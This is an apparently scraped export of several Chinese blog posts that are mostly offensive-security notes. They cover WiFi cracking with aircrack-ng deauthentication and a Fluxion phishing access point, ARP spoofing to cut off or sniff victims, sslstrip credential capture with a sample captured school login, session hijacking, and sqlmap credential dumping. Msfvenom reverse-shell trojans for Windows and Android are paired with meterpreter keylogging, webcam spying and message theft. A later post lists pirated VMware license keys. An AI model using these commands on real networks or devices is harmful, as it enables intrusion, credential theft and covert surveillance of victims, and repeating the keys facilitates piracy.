be displayed to you as it arrives below:directory traversal attempt detected from: 192.168.31.103192.168.31.103 - - [14/Dec/2018 19:08:55] \"GET /api/v4/search/preset_words HTTP/1.1\" 404 -192.168.31.103 - - [14/Dec/2018 19:08:58] \"GET / HTTP/1.1\" 200 - ------------------------------------------分割线------------------------------------------ 有点累了，后面的内容日后有时间再来更新吧。 2018-12-14,By Zero","path":"2018/12/14/渗透攻击/"},{"title":"WIFI破解","text":"免责申明正如《Metasploit渗透测试指南》一书所述： 不要进行恶意的攻击 不要做傻事 在没有获得书面授权时，不要攻击任何目标 考虑你的行为将会带来的后果 如果你干了些非法的事情，天网恢恢疏而不漏，你总会被抓到牢里的 任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。 前言目前，无论是在家，还是在校，亦或是各种商场，无线wifi都是星罗棋布。但你是否注意到，像CMCC、ChinaNet，亦或是其他一些表面上看上去比较信得过的wifi名（BSSID）很是常见，尤其是在人流量高、人口密度大的区域。此时的你或许会感到疑惑，但是当你看见Free字样再加上你目前对wifi的需求，一时昏了头的你可能就管不了那么多了（管他三七二十一，连上再说，Free的wifi不要白不要，我傻啊！！！）。令你始料未及的是一旦当你client那些钓鱼wifi之后，你的手机内的一切的一切的信息都在对方的掌控之中，比如说照片、通讯录、各种应用密码等，我们换句话说，你的手机在这一瞬间就相当于有了第二个主人。 综上，在这鱼龙混杂的万千世界中了解一些网络安全的知识对于每个人来说都是有必要的。本文主要介绍无线渗透中的关于wifi破解一些常用方法以此加强您的自我防护意识。 环境准备环境介绍 系统：Kali Linux可在其官网了解相关信息及下载iso镜像文件。 USB无线网卡笔电内置的无线网卡不可用于Kali Linux的无线学习，我们需要购买一个外置的USB无线网卡，可根据自己的需要在某宝进行购买。本文使用的是RT3070，购买链接是：https://item.taobao.com/item.htm?spm=a230r.1.14.67.72537d6elT6GLa&amp;id=576808272403&amp;ns=1&amp;abbucket=13#detail Kali安装及基本配置Kali安装目前主要使用的渗透工具主要有两种，一个是Backtrack，另一个是Kali，两者在使用上来讲并无差别，在本文中使用的是Kali Linux系统。 Kali官网及下载地址：https://www.kali.org/ 在官网下载好Kali Linux iso镜像文件之后，我们需要将其进行安装，一般有U盘安装、虚拟机安装、双系统等方式。本文只介绍VMware虚拟机中安装Kali的方式，有其他需要的朋友可自行查找相关资料。 Kali的安装总的来说和Ubuntu的安装并无一二，安装kali可暂且移步：Xshell远程连接linux并远程访问Jupyter notebook服务（深度学习环境的搭建），如下所示部分： 在这里值得一说的是，在Kali安装的最后一步中，会有两个选择，一个是手动输入设备，另一个是/dev/sda，在这里我们务必选择/dev/sda，选择之后待其自动重启即可使用。 Kali的基本配置 该部分内容以后有时间单独成文记录。 Fluxion安装Fluxion的官方部分说明如下： Fluxion is a security auditing and social-engineering research tool. It is a remake of linset by vk496 with (hopefully) fewer bugs and more functionality. The script attempts to retrieve the WPA/WPA2 key from a target access point by means of a social engineering (phishing) attack. It’s compatible with the latest release of Kali (rolling). Fluxion’s attacks’ setup is mostly manual, but experimental auto-mode handles some of the attacks’ setup parameters. Read the FAQ before requesting issues. 总的来说，Fluxion不同于一般的暴力wifi破解，它是通过社会工程学来获取WPA2秘钥。 Github地址：https://github.com/wi-fi-analyzer/fluxion.git官网地址：https://fluxionnetwork.github.io/fluxion/ 在安装Kali Linux之后，虽然其就像Anaconda一样集成了大量的工具，但是默认是没有对Fluxion进行安装的，所以需要我们自行安装，此处安装使用git即可，命令如下：1git clone https://github.com/wi-fi-analyzer/fluxion.git 不到一杯茶的功夫即可完成该下载过程。 WIFI破解万能钥匙获取wifi秘钥在wifi破解中，相信大家接触最多的就是万能钥匙了，但是只限连接部分的查询结果wifi，而且连接成功后绝大部分人并不知道连接的wifi密码，所以先从万能钥匙说起，由于万能钥匙不是本文的重点，所以在这只蜻蜓点水般介绍即可。 在连接万能钥匙之后，我们可以通过以下三种方式来获取秘钥。 RE获取进入RE管理器（手机默认文件管理器），打开/data/misc/wpa_supplicant.conf文件可见psk字段，即wifi明文秘钥。（操作前提需要ROOT） 微信获取打开手机并进入无线wlan界面，点击你使用万能钥匙连接的wifi可见一个二维码，保存该二维码之后可使用微信进行扫描，扫描结果可见此wifi明文秘钥。 电脑获取在终端使用如下命令可见秘钥1netsh wlan show profile name=[wifi名] key=\"clear\" Kali暴力破解airmon-ng监听插上USB无线网卡之后，我们将需要该网卡连接至Kali Linux系统中才能正常侦测到周围wifi，可根据虚拟机 -&gt; 可移动设备 -&gt; USB连接进行操作，如下图所示（这张图不太好截，手机拍的，根据图片操作即可）： 之后，我们需要确认是否已经网卡的引入，可通过如下命令进行操作：1ifconfig -a 输出结果如下： 若命令输出wlan0网卡，则说明已经映射成功，之后我们即可启动该网卡来进一步的进行侦测周围wifi，启动如下可根据如下命令进行（三部曲）：123456# 关闭network-manager服务，已避免对网卡造成不必要的影响service network-manager stop # 我们在使用暴力破解wifi时，会使用到airmon-ng，该命令可将对airmon-ng产生影响的进程kill掉airmon-ng check kill # 启动wlan0网卡，处于监听（monitor）状态airmon-ng start wlan0 补充： 查看影响airmon-ng使用的进程：airmon-ng check关闭监听（monitor）状态：airmon-ng stop wlan0mon重启network-manager服务：service network-manager restart当无线网卡无法继续监听时，可尝试一下操作（重启）： ifconfig wlan0mon down ifconfig wlan0mon up airodump-ng 探测在使用USB无线网卡监听之后，我们就能对周围的wifi进行探测了，该过程可以探测到包含了wifi的详细信息：BSSID、ESSID、信道等，对周围所有的wifi进行探测的命令如下：1airodump-ng wlan0mon 命令执行结果如下图所示： 结果分析： BSSID：Service Set Identifier，站点的MAC地址，用于区分不同的网络，可理解为路由器的身份证PWR：可理解为信号强度的体现，绝对值越小信号越强Beacons：连接该wifi（AP）所发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送10个左右的beacon，所以它们能在很远的地方就被发现。#Data：数据传输量#/s：过去10秒钟内每秒捕获数据分组的数量。CH：信道MB：AP的最大传输速率ENC：加密方式CIPHER：检测到的加密算法。这个不是特别懂。AUTH：认证协议ESSID：侦测到的wifi名 更多详尽的专业解释可见：https://wenku.baidu.com/view/1907172e7375a417866f8f30.html 当你执行如上命令之后，的确可以侦测到附近所有的wifi接入点，但是我们确定了破解的wifi目标之后，我们需要对结果进行一些特定的限制（筛选）以便更为方便的分析，指定探测命令如下：1airodump-ng wlan0mon --bssid [目标MAC地址] -c [频道] -w [抓包结果的文件名] 其中STATION表示目前连接该wifi下的设备的MAC地址 aireplay-ng抓包对指定wifi进行探测之后，有时我们并不会主动对该wifi进行抓包操作，原因是在我们使用airodump的时候，原设备就已经连接到我们的目标wifi了，此时要想抓包，我们需要使用到aireplay-ng来对目标设备进行强制断开连接，待其自动连接之后我们也就抓到包了，命令如下：1aireplay-ng -0 2 -a [接入点MAC地址] -c [客户端接入地址] wlan0mon 执行结果如下： 解释：上述的包与爬虫抓包类似，可以简单的理解为含有我们需要重要信息的文件。 aircrack-ng 破解通过上述操作，我们已经成功抓包了，通过以下命令来查看抓包文件:1cd /root &amp;&amp; ls 我们破解时主要用到的是.cap文件，破解命令如下：1aircrack-ng -w [字典文件] [.cap文件] Kali自带的字典文件目录有以下几个（比较小）：123/usr/share/john//usr/share/wfuzz/wordlist//usr/share/wordlists/ 解释：暴力破解，顾名思义就是我们需要准备一个尽量详尽且可能较大的字典文件，该文件中也许包含了小至以M为单位的秘钥文件，大至以G为单位的秘钥文件，然后使用aircrack-ng一个个去暴力破解，待其找到正确秘钥之后就会自动终止程序。通过如上解释，所以说如果我们的字典足够完整，也许在你睡一觉之后即可破解，此时的你需要对收获与时间成本进行考量，，还有一种情况就是几天下来直至字典跑完也没有成功破解wifi，原因就是使用的字典中未含有正确秘钥。 补充：1. 可通过彩虹表的方法来增大跑字典的效率。2. 可以使用GPU来增大跑字典的效率。3. 可使用kali内置的crunch工具自动生成字典。以上补充有兴趣的可以去了解，这里就不详细说明了，有时间的话也许会在后面的文章单独成文。 常用命令：123grep [Password] [字典] # 查看字典中是否含有目标秘钥cat [字典] | wc -l # 查看字典文件有多少行数据cd /usr/share/wordlists &amp;&amp; gunzip rockyou.txt.gz # 解压Kali自带rockyou.txt.gz文件 使用aircrack-ng之后，如果破解成功将显示如下内容： Fluxion社会工程学破解以上是Kali暴力破解的内容，但往往我们使用暴力破解的结果不尽如人意，此时我们可以考虑Fluxion社会工程学来进行破解。社会工程学是很高深的一门学问，为了吊大家的胃口这里就简单的说下：好像是外国一名黑客入侵攻击之后被抓坐牢，然后出了一本书。强烈推荐大家去了解下，很有意思的 (￣_,￣ )，像许多电影亦或是电视剧都有相关内容的出现，比如《Who am i，没有绝对的安全系统》、《黑客军团》，为了让该推荐在该文章中更加的醒目些，以下博主推荐的连接内容务必前去看看，相当有意思的，不感兴趣的话那就算了(ノへ￣、)： https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/2136830?fr=aladdin https://baike.baidu.com/item/%E6%AC%BA%E9%AA%97%E7%9A%84%E8%89%BA%E6%9C%AF/10253577 好了，社会工程学介绍完了，我们来讲讲Flusion的使用吧（前面已经安装过了，忘了的可往回翻一翻）。 12345cd /root/ # 进入root目录（根据自己的Fluxion安装路径）ls # 列出当前所有文件，查看是否含有fluxioncd fluxion # 进入fluxionls # 查看该项目内的文件，具体文件介绍可自行查找资料，这里接不说了./fluxion.sh # 启动fluxion 启动之后，你或许会看见如下内容： 内容显示你当前kali中并没有安装相关插件，我们可通过如下进行安装：1apt-get install XXXXXX # XXXXXX表示的是未安装的插件，比如apt-get install bc，将所有的插件安装一遍即可 安装之后我们再次执行fluxion:1cd /root/fluxion &amp;&amp; ./fluxion.sh 初次接触fluxion的朋友可能不知道怎么操作，但具体操作也没有那什么难度，所以这里就贴图简单的解释一下。 选择语言 从上图我们可以看到有11个选项，每个选项对应一种语言操作，这里我们直接选择6：chinese 选择网卡 此处是网卡的选择，当你插上USB无线网卡并成功连接之后，虚拟机会自动监听，所以直接默认即可 选择信道并开始监听 这里我们选择所有信道，选择之后将会出现类似之前跑字典的信道界面，当看见你想要破解的wifi之后我们需要执行ctrl+c退出即可 选择目标 选择目标wifi代号 创建AP 因为这里我们使用的是社会工程学来进行欺骗，所以我们需要创建一个伪装AP来供目标连接，直接选择1即可 ——————————————————————————————分割线—————————————————————————————— 后面的内容就是真正的拦截过程，由于现在室友正在使用wifi，这里就暂时写到这了，以后有机会再来补充。简单的介绍一下吧： 首先执行生成一个web站点，该站点为钓鱼网站，主要用于目标登录其Wifi。我们执行命令之后，目标路由器或者交换机上所连接的设备将会自动断开，此后将会自动生成一个我们伪装的AP，待目标设备连接上该AP之后将会自动跳转到钓鱼站点，待其输入密码后我们既能在Kali终端下得到目标wifi的密码，得到密码之后程序将会自动终止，目标wifi也将恢复正常。 总结以上就是本文所有wifi的破解方法了，如果日后接触到了其他其他方法再在本文进行更新。最后，在这里再提醒一下： 任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文只供学习，切勿用于非法操作，一切后果由使用者本人负责。 2018-10-12,By Zero","path":"2018/10/12/WIFI破解/"},{"title":"Kali基本操作","text":"以下内容为博主学习《Kali Linux渗透测试的艺术》一书所记录的笔记，有点凌乱、还未整理，有时间再来弄。 一、换源并安装open-vm-tools1.1 打开sources.list文件1leafpad /etc/apt/sources.list 1.2 在文件中添加如下内容1234deb http://mirrors.edu.cn/kali sana main non-free contribdeb http://mirrors.edu.cn/kali-security/sana/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-freedeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free 1.3 更新并安装12apt-get updateapt-get install open-vm-tools-desktop fuse 二、安装中文输入2.1 下载搜狗在pinyin.sogou.com/linux中下载搜狗 2.2 安装终端进入上方文件路径，执行如下：12解决依赖：apt-get install -f安装：dpkg -i 包名 三、美化kali图标位置：/usr/share/icons/主题位置：/usr/share/themes/ 四、局域网断网攻击4.1 欺骗欺骗命令如下：1arpspoof -i 网卡 -t 被骗目标ip 网关 欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下： 右键kali系统，点开设置 将网络适配器设置成桥接模式 一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定 参数解读： 网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0） 被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看 网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关） ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：1fping -asg 192.168.31.0/24 //网关最后是0+24 4.2 攻击4.2.1 瘫痪对方的电脑执行上述命令，即可让对方的网络瘫痪： 1arpspoof -i 网卡 -t 被骗目标ip 网关 执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作 4.2.2 劫持对方的请求（账号，密码之类的）这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：123cd /proc/sys/net/ipv4/ # 进入该目录cat ip_forward # 查看属性值，会发现输出0（默认是0，我们需要更改为1）echo 1 &gt; ip_forward```# 将ip_forward值改为1 如上操作之后我们继续执行arpspoof欺骗：1arpspoof -i 网卡 -t 被骗目标ip 网关 在欺骗之后，我们执行如下命令来进行嗅探：1ettercap -Tq -i eth0 执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码 4.2.4 嗅探对方的浏览图片在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：1driftnet -i eth0 执行之后，会出现一个窗口 ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地 五、https账号、密码获取5.1 准备工作5.1.1 Vim：文本编辑器进入文件进行编辑：vim 123.txt （不存在会自动创建）退出文件编辑： 按ESC shift+： 输入q！ # 不保存退出 打开 etterc.conf文件1vim /etc/ettercap/ettc.conf/ 移动光标，把linux设置一下，将redir前的注释符删掉123# if you use iptables: #redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" #redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" 刚开始是不能编辑的，编辑操作如下 vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉 vim保存：按一下ESC键，再按shift+:键，继续如下： wq 保存并退出 q! 不保存并退出 5.1.2 开启ssh：1/etc/initd/ssh start 5.1.3 sslstrip工具这个工具能够把https的链接还原为http。执行命令：1sslstrip -a -f -k 参数说明： -a -f -k 5.2 截取账号及密码 执行欺骗操作 1arpspoof -i eth0 -t 192.168.31.117 192.168.31.1 执行sslstrip 1sslstrip -a -f -k 执行ettercap 1ettercap -Tq -i eth0 当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下： 12345HTTP : 211.80.112.41:80 -&gt; USER: 1620814 PASS: 741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a INFO: mids.gench.edu.cn/_customize/passLoginCONTENT: loginTicket=425d9c18-424b-418d-b027-2095e618f829&amp;username=1620814&amp;password=741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a 分析： HTTP：ip及端口 USER：用户名 PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍 CONTENT：参数的组合 六、回话劫持，登录目标站点6.1 工具准备 arpspoof 欺骗 wireshark 抓包 ferret 重新生成抓包后的文件 hamster ferret安装，一次执行如下：123dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install ferret-sidejack:i386apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -yapt install ferret -y 6.2 过程（方法一） arpspoof欺骗 启动wireshark 1wireshark 点击eth0网卡，并让他持续运行下去 目标登录某个站点（上钩） 为了防止延迟，让wireshark再运行一段时间之后停掉wireshark 保存文件名为cookie至桌面，并格式为wireshark…….pacp 终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）： 1ferret -r cookie.pcap 执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234 代开kali内置的火狐浏览器 点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234 在kali中访问127.0.0.1：1234 之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到 6.3 过程（方法二） ferret -i eth0 以后在记录 七、SQLMAP注入，ASP、PHP网站渗透7.1 科普7.1.1 ASPASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] 7.1.2 PHPPHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。 7.2 ASP渗透 监测是否存在注入1sqlmap -u 网站 如果该目标网站有注入，则会返回数据库的各种信息。 拆解目标网站的数据库表 1sqlmap -u 网站 --tables 根据User表拆解列名 1sqlamp -u 网站 --columns -T \"user\" username拆解出来后就不需要再进行拆解了 得到目标网站后台管理员的登录密码1sqlmap -u 目标网站 --dump -C \"username,password\" -T \"user\" —dump：下载数据-C “username,password” 列名 7.3 PHP渗透待更新 7.4 Cookie渗透待更新 八、Metasplooit8.1 基本操作 启动：msfconsole 漏洞利用工具：exploit 漏洞执行后的demo：payloads 8.2 远程控制软件8.2.1 实现过程 根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f exe &gt; test.exe 之后会生成一个test.exe木马程序，将文件拖至windows平台上 使用handler模块，本操作以及之后的操作是在msfconsole下执行 1use exploit/multi/handler 用shellcode程序 1set PAYLOAD windows/meterpreter/reverse_tcp 查看 1show options 设置参数，比如设置ip和端口 12set LHOST 自己的ipset LPORT 端口（55555） 执行并等待目标上钩 1exploit 8.2.2 木马基本功能当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作： sysinfo：获取到对方设备的系统信息 shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备 background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话 run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。 注入进程 得到要注入的pid进程：ls migrate XXX（pid）注入 8.2.3 文件管理功能 download 下载文件 edit 编辑文件 cat 查看文件 mkdir 创建文件夹 mv 移动文件 rm 删除文件 upload 上传文件 rmdir 删除文件夹 8.2.4 网络及系统操作网络操作： arp 看arp缓冲表 ifconfig ip地址网卡 getproxy 获取代理 netstat 查看端口链接 系统操作： kill 杀进程 ps 查看进程表 reboot 重启电脑 reg 修改注册表 shell 获取终端 shutdown 关闭电脑 sysinfo 获取系统信息 8.2.5 用户操作和其他功能 enumdesktops 窗体 keyscan_dump 键盘记录—下载 keyscan_start 键盘记录—开始 keyscan_stop 键盘记录—停止 uictl 获取键盘鼠标控制权 record_mic 声音和音频录制 webscan_chat 查看摄像头接口 webscan_list 查看摄像头列表 webscan_stream 查看摄像头获取（偷窥） getsystem 获取管理员权限 hashdump 下载hash 九、安卓渗透9.1 实现过程 9.1 在终端根据自己的ip生成安卓木马1msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f apk &gt; test.APK 生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。 9.2 启动Metasplooit 1msfconsole 9.3 使用handler 1use exploit/multi/handler 9.4 设置安卓木马 1set PAYLOAD android/meterpreter/reverse_tcp 9.5 查看参数 1show options 9.6 设置参数 12set LHOST 192.168.31.147set HPORT 55555 9.7 启动监听 1exploit 9.2 常见操作 search 搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！ download 下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………） webcam_stream 开启手机摄像头 webcam_snap 启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的） check_root 检查ROOT dump_calllog 下载电话记录 dump_contracts 下载短信记录 geolocat gps定位 十、Fluxion10.1 Fluxion下载下载fluxion源码并进入fluxion且运行：1234git clone https://github.com/FluxionNetwork/fluxion.git cd fluxion./fluxion.sh若提示没下载fluxion.sh，则按照要求下载就行 十一、密码破解 查看kali本机的密码字典 1locate wordlist 查看某个密码文件 1cat /etc/shadow 拷贝/etc/shadow密码文件 1cp /etc/shadow/ /root/Desktop/hash.list more /etc/login.defs 十二、Hydra1 十三、无线破解首先做的三步：123service network-manager stopairmon-ng check killaiarmon-ng start wlan0 开启监听：1airmon-ng statr wlan0 监听所有：1airodump-ng wlan0mon 监听指定bssid：1airodump-ng wlan0mon --bssid XXXX -c 频道 -w wpa(保存名) 将连接打掉：1aireplay-ng -0 2 -a [mac地址] -c [客户端mac地址] wlan0mon 12ifconfig wlan0mon downifconfig wlan0mon up 破解：1aircrack-ng -w [字典] /root/XXX.cap kali自带常用字典目录：12/usr/share/john/password.lst/usr/share/wfuzz/wordlist/ 查看字典文件是否含有该密码：1grep Password password.lst 查看字典有多少行：1cat [字典] | wc -l 解压文件：1gunzip rockyou.txt.gz 发现支持wps的AP123wash -i wlan0mon或者是airodump-ng wlan0mon --wps 爆破pin码：1reaver -i wlan0mon -b [ap mac] -vv -c [信道] wifite 伪造wifi：1airbase-ng -a [ap_mac] -c [信道] --essid [wifi名字] wlan0mon ```echo [ap(wifi名)] &gt;essid.txtairolib-ng essid_db —import essid essid.txtairolib-ng essid_db —statsairolib-ng essid_db —import password ./names.txtairolib-ng essid_db —batchaircrack-ng -r essid_fb /root/wpa-01.cap","path":"2018/09/28/Kali/"},{"title":"本站须知","text":"阅前建议本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。 免责声明本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。 博主希望本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。 本站转载文章会在醒目处留有说明，如有侵权还请联系。 如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话可不要扔鸡蛋，谢谢。","path":"2018/09/26/本站须知/"},{"title":"Xshell远程连接linux并远程访问Jupyter notebook服务（机器学习环境的搭建）","text":"前言如今，机器学习、人工智能、深度学习等高深知识逐渐融入大家的视野，为了跟上技术的更新，不被时代所淘汰、out、出局，博主也想打算开始深度学习。而据说如今机器学习最好的环境是Python + Jupyter notebook + Tensorflow了，为此首先需要搭建一个这么个环境，以便开始深度学习之旅。此外，若能搭建一个自己的深度学习服务器再好不过了，所以本文将从以下三个部分的内容进行介绍： 环境准备 Xshell远程连接Ubuntu Jupyter notebook服务器的配置及远程访问 远程环境的测试 OK，话不多说，开始进入正轨吧。(#`O′) 一、环境准备环境介绍 准备两台计算机，一个作为服务端，一个作为客户端。 服务端：Linux系统（Ubuntu）官方介绍：Ubuntu（友帮拓、优般图、乌班图）是一个以桌面应用为主的开源GNU/Linux操作系统，Ubuntu 是基于Debian GNU/Linux，支持x86、amd64（即x64）和ppc架构，由全球化的专业开发团队（Canonical Ltd）打造的。Linux系统区别于windows系统最大的区别是其主要是利用终端 Shell 命令来进行一系列的操作，所以在实际使用过程中常常用来搭建服务器，该系统搭建在VMware虚拟机中。 客户端：Windows10系统这个大家再熟悉不过了，就不介绍了。 Anaconda官方介绍：Anaconda指的是一个开源的Python发行版本，其包含了conda、Python等180多个科学包及其依赖项。所以说，当我们下载了Anaconda之后就不必要再下载Python其他包了，其内部集成了大量大Python工具，其中就包括我们这篇文章的主角Jupyter notebook。 Xshell这个就没什么好说的了，它主要是一种远程连接的工具，使用它之后我们就可以通过ssh协议来远程连接Ubuntu系统了，而且它常常与远程文件传输工具Xftp配套使用。 软件下载这里给大家两种方式进行下载，一个是官网下载，一个是鄙人的网盘下载，大家根据自己的方便下载即可。 官网： Anaconda：https://www.anaconda.com/download/，于服务端下载 Xshell：https://xshell.en.softonic.com/?ex=BB-682.0，于客户端下载 Ubuntu：https://www.ubuntu.com/download/desktop，于服务端下载 VMware：https://www.ubuntu.com/download/desktop，于服务端下载 网盘： Anaconda：https://pan.baidu.com/s/1Z4XuYwYvK6CqJigSrEWjuQ， 密码：1pbs，于服务端下载 Xshell：https://pan.baidu.com/s/1KKqsFrhbPUM2Yc_Jukm5sw， 密码：fi0y，于客户端下载 Ubuntu：https://pan.baidu.com/s/1Zwz1GGlEtlStnS-5OFsecQ， 密码：50yw，于服务端下载 VMware：https://pan.baidu.com/s/1-h0HLJGrXbJjwzfU5I2rww， 密码：hjnq，于服务端下载 VMware下安装Ubuntu注意：以下内容都是在服务端计算机中进行配置 在VMware虚拟机下安装Ubuntu系统虽然有点步骤，但是并不复杂。在综合考虑到时间成本与其给大家带来的价值的关系下，博主就用文字描述了，暂时不贴图了。但是你不必担心，关键步骤还是会贴图说明的 ( ﹁ ﹁ ) ~→。 在服务端下载好VMware及Ubuntu之后。首先打开VMware你会发现他会让你输入VMware秘钥，以下将给出几个目前有效的秘钥，当你使用的时候也许已经失效了，你可以自行百度查找秘钥： 12345FF31K-AHZD1-H8ETZ-8WWEZ-WUUVACV7T2-6WY5Q-48EWP-ZXY7X-QGUWDZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8ZC5XK-A6E0M-080XQ-04ZZG-YF08DZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8 输入秘钥之后 ，进入到了VMware的页面了，为了缩短文章的字数，博主还是使用windows自带的mspaint来绘制一个流程图来为大家介绍下Ubuntu的安装吧，尽量简洁明了： 原本以为制作这个流程图用不了多少时间，结果却用了20分钟，但是如此一来思路清晰、逻辑性强，值了（好吧，不吹自己了，还有很大的提升空间），w(ﾟДﾟ)w。好了，至此Ubuntu就已经安装好了，如果有卡壳的地方可在文章末留言或者左侧的Gitalk留言。 Ubuntu下Anaconda的安装在VMware下安装好Ubuntu后，虽然Ubuntu内自带了Python，但是其版本是2.7的，而且许多常用的包并没用集成，所以我们还需要安装Anaconda。 根据以上Anaconda的下载方式下载Anaconda，进入到其目录之下（或者cd操作），然后打开终端，执行如下命令进行安装：1bash Anaconda3-5.3.1-Linux-x86_64.sh # 不要盲目的复制粘贴，根据自己所下载的Anaconda版本执行 执行之后会有一些列诸如同意协议之类的问题，我们默认即可（直接Enter，或者yes），直到出现Anaconda环境变量配置的显示，我们需要选择将其加入到环境变量中去。一系列操作之后，我们关闭终端然后在重新打开终端，然后在终端分别执行conda list、python命令，如果你的终端界面出现类似以下输出，则恭喜你说明你已经完成了anaconda的安装。 而如果你的终端输错报错（未找到conda命令之类的）或者Python版本为2.7，那就说明你以上操作中未将Anaconda加入到环境变量，所以你需要手动配置Anaconda的环境变量，操作如下：123# 打开环境变量的配置文件，从这里我们就可以看出Linux和Windows下的操作的区别了# windows一般是通过界面的形式进行设置，而Linux下则大多数通过终端并使用vim进行配置sudo vim gedit /root/.bashrc 打开文件之后我们需要在文件末尾添加如下内容1export PATH=\"XXX:$PATH\" # XXX为你的Anaconda的bin目录，例如我的是/home/lxj/anaconda3/bin 然后保存，在终端输入source ~/.bashrc进行更新即可完成Anaconda环境变量的配置，不出意外的话再次分别执行Python、conda list命令之后你会看见正确的输出了。 补充：这里需要说明一下，以上的操作是使用Vim进行文件编辑的，他不同于windows下的记事本等，而是通过特定的操作来对文件进行编辑。对于熟悉Vim操作的应该会理解以上Anaconda环境变量的配置，然而如果是对Vim比较陌生的朋友可能会卡壳，所以在这里简单介绍一些vim的操作。 在终端使用vim命令之后将会进入到vim的界面，此时的界面是不允许modify任何内容的，只允许read only。此时我们输入i将会进入到vim的编辑模式，现在就能对该文件进行修改了。文件内容修改完成之后，我们需要退出该vim编辑模式，vim 的退出常用的有以下几种（首先输入Esc键）： q! -&gt; 不保存文件修改并退出 wq -&gt; 保存文件的修改并退出 wq! -&gt; 有时候我们需要root权限才能编辑文件，使用该命令之后就能够强制修改并退出对于以上Anaconda环境变量的配置，vim的熟悉至此就足够了，但是顺便介绍一下其他常用的命令供大家参考，也是记录一下方便以后的回顾： dd -&gt; 剪切当行内容 Ctrl+b -&gt; 内容向前移动一页 ctrl+f -&gt; 内容向后移动爷爷 shift+g -&gt; 